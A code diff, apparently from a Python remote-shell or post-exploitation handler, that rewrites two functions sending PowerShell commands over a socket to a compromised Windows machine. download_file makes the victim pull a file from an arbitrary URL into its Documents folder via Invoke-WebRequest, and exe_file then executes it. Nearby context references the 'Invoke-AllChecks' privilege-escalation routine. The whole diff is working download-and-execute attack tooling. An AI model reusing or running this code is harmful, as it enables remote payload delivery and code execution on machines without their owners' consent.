@@ -118,9 +118,10 @@ Invoke-AllChecks"""
 
 
 def download_file(s, link, filename):
-    d = """cd %UserProfile%\\Documents
+    d = """$a = $env:USERPROFILE + "\Documents"
+cd $a
 $url = \" """ + link + '''\"
-$output = \"'''+ '%UserProfile%\\Documents\\' +filename + """\"
+$output = $env:USERPROFILE + "\Documents\\" + \"'''+ filename + """\"
 $start_time = Get-Date
 Invoke-WebRequest -Method Get -Uri $url -OutFile $output
 Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"
@@ -128,9 +129,11 @@ Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)
     s.send(d)
     print(recv_a(s))
     p("\x1b[1;36m[+]\x1b[0m File downloaded.")
-def exe_file(s, filename, filepath="%UserProfile%\\Documents\\"): 
+def exe_file(s, filename, filepath="$env:USERPROFILE + \"\Documents\\\""): 
     p("\x1b[1;36m[+]\x1b[0m Executing file.")
-    d = '& \'.\\' + filepath + filename + "'\n"
+    d = '$d = ' + filepath + "\n"
+    d += "cd $d\n"
+    d += "& './" + filename + "'\n"
     s.send(d)
     print(recv_a(s))
     p()
